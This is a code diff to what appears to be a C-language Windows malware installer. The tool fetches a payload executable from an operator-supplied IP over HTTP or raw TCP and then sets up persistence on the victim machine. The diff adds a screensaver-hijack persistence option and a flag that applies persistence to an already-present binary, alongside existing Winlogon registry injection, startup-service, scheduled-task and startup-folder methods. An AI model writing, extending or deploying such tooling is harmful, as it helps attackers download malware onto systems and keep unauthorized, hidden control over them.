@@ -175,7 +175,7 @@ int HandlePersistence(char *opt, void *data) {
             "Create a startup service",
             "Create a scheduled task",
             "Hijack screensaver",
-            "Add payload to the startup folder"
+            "Add the payload to the current user's startup folder"
         );
         printHelp = FALSE;
         return CONTINUE_ERROR;
@@ -191,6 +191,11 @@ int HandlePersistence(char *opt, void *data) {
             return SUCCESS;
         case '2':
             if (!InjectWinlogonRegistry(pPersContext)) {
+                return CONTINUE_ERROR;
+            }
+            return SUCCESS;
+        case '5':
+            if (!HijackScreensaver(pPersContext)) {
                 return CONTINUE_ERROR;
             }
             return SUCCESS;
@@ -231,11 +236,11 @@ int HasWriteAccess(char *dirPath, void *data) {
     return SUCCESS;
 }
  
-BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port, BOOL *socketReceive) {
+BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port, BOOL *socketReceive, BOOL *onlyPersistence) {
 	int opt;
 	int iFlag = 0, eFlag = 0, tFlag = 0;
 	*port = 80;
-	while ((opt = getopt(argc, argv, "i:e:t:p:s")) != -1) {
+	while ((opt = getopt(argc, argv, "i:e:t:p:sP")) != -1) {
 		switch (opt) {
 			case 'i':
 				*ipLen = strlen(optarg);
@@ -272,18 +277,26 @@ BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *ex
                 break;
             case 's':
                 *socketReceive = TRUE;
-            break;
+                break;
+            case 'P':
+                *onlyPersistence = TRUE;
+                break;
 			default:
 				return FALSE;
 				break;
 		}
 	}
-	if (!iFlag || !eFlag) {
+	if (!(*onlyPersistence) && (!iFlag || !eFlag)) {
 		return FALSE;
 	}
-    if (!tFlag) {
+    if (!(*onlyPersistence) && !tFlag) {
         *targetLen = *exeLen;
         strncpy(target, exe, (*exeLen) + 1);
+        return TRUE;
+    }
+    if ((*onlyPersistence) && !tFlag) {
+        TranslateErrorPrintStr("If only persistence flag is specified (-P) target (-t) to the existing binary must specified");
+        return FALSE;
     }
 	return TRUE;
 }
@@ -302,7 +315,7 @@ int main(int argc, char* argv[]) {
     char targetDirTmp[MAX_PATH + 1];
     char opt[16];
     BOOL receiveUsingSocket;
-
+    BOOL onlyPersistence = FALSE; // Skip installation if the binary already exists
     char *errMsg;
     DWORD errCode;
 
@@ -313,10 +326,26 @@ printf("     .    .     .            +         .         .                 .  .\
 
 
 
-    if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket) == FALSE) {
+    if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket, &onlyPersistence) == FALSE) {
         printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>] [-s (use raw TCP sockets)]\n", argv[0]);
 		exit(1);
 	}
+
+    if (onlyPersistence) {
+        if (!FileExists(target)) {
+            TranslateErrorPrintStr("Binary not found!");
+            exit(1);
+        }
+        payloadFullLen = GetFullPathNameA(target, MAX_PATH, payloadFull, NULL);
+        if (!payloadFullLen) {
+            TranslateErrorPrint(GetLastError());
+            exit(1);
+        }
+
+        // Skip the installation process
+        printf("[+] File located at %s\n", payloadFull);
+        goto pers;
+    }
     
     if (!receiveUsingSocket) {
       	snprintf(source, MAX_URL, "http://%s:%d/%s", ip, port, exe);
@@ -330,8 +359,7 @@ printf("     .    .     .            +         .         .                 .  .\
     } else {
         printf("[*] Will be received using TCP socket. Host: %s:%d\n", ip, port);
     }
-    //DOWNLOAD_CONTEXT downloadContext;
-    //goto test;
+
     if (!PromptUntilValid("Target Directory", targetDirTmp, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL, FALSE)) {
         exit(1); 
     }
@@ -378,7 +406,7 @@ printf("     .    .     .            +         .         .                 .  .\
             exit(1);
         }
     }
-test:
+pers:
     printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n");    
     PERS_CONTEXT persContext = {
         .regKey = NULL,
